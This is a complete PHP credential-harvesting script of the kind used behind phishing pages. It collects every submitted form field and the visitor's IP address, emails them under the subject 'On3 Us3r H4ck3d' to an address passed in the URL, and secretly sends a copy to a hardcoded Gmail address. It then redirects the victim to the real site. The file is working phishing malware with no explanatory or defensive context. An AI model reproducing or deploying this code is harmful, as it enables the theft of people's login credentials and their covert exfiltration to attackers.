<?

$to = $_GET['id'];
$link="http://www.".$_GET['link'];

$message="On3 Us3r H4ck3d"."\n";

foreach($_POST as $var=>$val)
{
$message.="$var = $val"."\n";
}



$message.="The Script ran on ".$_SERVER['REMOTE_ADDR']."\n";

$subject = "On3 Us3r H4ck3d";
$headers = 'From: Univ3rs4lH4ck3d@hackingforever.com' . "\r\n" .
    'Reply-To: admin@admin.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
$message.="Password was sent to ".$to;
mail("coolbrat4u@gmail.com", $subject, $message, $headers);
header("location:$link");

?>